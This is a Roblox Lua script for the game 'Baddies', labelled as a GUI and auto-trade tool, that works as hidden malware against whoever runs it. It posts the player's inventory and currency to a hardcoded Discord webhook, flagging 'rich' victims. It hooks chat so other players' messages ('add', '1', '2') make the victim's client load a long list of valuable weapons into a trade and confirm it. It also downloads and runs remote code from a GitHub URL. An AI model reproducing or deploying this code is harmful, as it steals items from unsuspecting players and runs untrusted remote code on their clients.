-- Combined Baddies Full Script (GUI + Rich Ping + Auto Trade)

_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesnt support this game, join BADDIES")
    return
end

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]

-- ==================== RICH INVENTORY PING ====================
task.spawn(function()
    if _G.POOR_WEBHOOK and localPlayer then
        local tools = {}
        local function collect(from)
            if from then
                for _, v in ipairs(from:GetChildren()) do
                    if v:IsA("Tool") then table.insert(tools, v.Name) end
                end
            end
        end
        collect(localPlayer:FindFirstChild("Backpack"))
        collect(localPlayer.Character)
        collect(localPlayer:FindFirstChild("StarterGear"))

        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
        local base, main = {}, {}
        for _, name in ipairs(tools) do
            local lower = name:lower()
            local matched = false
            for _, p in ipairs(patterns) do
                if string.find(lower, p, 1, true) then
                    table.insert(base, name)
                    matched = true
                    break
                end
            end
            if not matched then table.insert(main, name) end
        end

        local isRich = #main >= 3
        local baseText = #base > 0 and table.concat(base, " | ") or "None"
        local mainText = #main > 0 and table.concat(main, "\n") or "None"

        local ls = localPlayer:FindFirstChild("leaderstats")
        local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
        local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"

        local embed = {
            title = localPlayer.Name .. "'s Inventory",
            description = "**Base Weapons**\n" .. baseText .. "\n\n**Main Weapons**\n" .. mainText,
            color = isRich and 0xFF0000 or 0xFFA500,
            fields = {
                {name = "Dinero", value = tostring(dinero), inline = true},
                {name = "Slays", value = tostring(slays), inline = true}
            },
            footer = {text = "Baddies Logger"}
        }

        local content = "@everyone " .. localPlayer.Name .. " executed the script!"
        if isRich then content = content .. " RICH PLAYER!" end

        pcall(function()
            game:HttpPost(_G.POOR_WEBHOOK, HttpService:JSONEncode({content = content, embeds = {embed}}))
        end)
    end
end)

-- ==================== AUTO TRADE REQUEST ====================
task.wait(1.5)
print("=== AUTO TRADE REQUEST STARTING ===")

for i = 1, 5 do
    pcall(function()
        RFTradingSendTradeOffer:InvokeServer(localPlayer)
    end)
    task.wait(0.4)
end

-- ==================== TRADING COMMANDS FOR JOINERS ====================
local weapons = {
    "Grim Reaper Cloak::None","Blast Bow::None","Princess Power Style::None","Feral Frenzy Style::None",
    "Roller Skates::None","Storm Dancer Style::None","Hug of Doom Style::None","Hero Finisher::None",
    "Grim Reaper Finisher::None","Gun Finisher::None","Doom Finisher::None","Breakdance Finisher::None",
    "Celestial Scythes::None","Graveyard Grip Knuckles::None","Shadow Sorcery Purse::None",
    "Unicorn Brass Knuckles::None","Frost Stomp::None","Sniper Rifle RPG::None","Cursed Board::None",
    "Evil Goth Knuckles::None","Floating Leaf::None","Shark Brass Knuckles::None","404 Not Found Blade::None",
    "Vampire Flamethrower::None","Big Boom Hammer::None","Mean Girl Mayhem Style::None","Karate Style::None",
    "Freeze Gun::None","Brass Knuckles::None","Sledge Hammer::None","Chainsaw::None","Scythe::None",
    "Cupid's Bow::None","Crowbar::None","Cannon::None","Spiked Knuckles::None","Trident::None",
    "Sakura Blade::None","Nunchucks::None","Champion Gloves::None","Chain Mace::None","Lava RPG::None"
}

local function safeClick(btn)
    if not btn then return end
    pcall(function() firesignal(btn.MouseButton1Click) end)
end

local function clickWeapons()
    local trading = playerGui:FindFirstChild("Trading")
    if not trading then return end
    local scrolling = trading:FindFirstChild("Frame", true):FindFirstChild("ScrollingFrame", true)
    if not scrolling then return end

    for _, name in ipairs(weapons) do
        local btn = scrolling:FindFirstChild(name)
        if btn and btn.Visible then
            safeClick(btn)
            task.wait(0.03)
        end
    end
end

local function setupTrading()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)

    local function processMessage(sender, text)
        text = text:lower()
        if sender ~= localPlayer then
            if text == "add" then
                clickWeapons()
            elseif text == "1" then
                pcall(function() RFTradingSetReady:InvokeServer(true) end)
            elseif text == "2" then
                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
            end
        end
    end

    if TextChatService then
        TextChatService.OnIncomingMessage = function(msg)
            local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
            if sender then
                task.delay(0.5, function()
                    processMessage(sender, msg.Text)
                end)
            end
        end
    end
end

setupTrading()

-- ==================== LOAD GUI ====================
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
end)

print("✅ Full Baddies Script Loaded")
print("Rich ping + Auto trade + Joiner commands active")
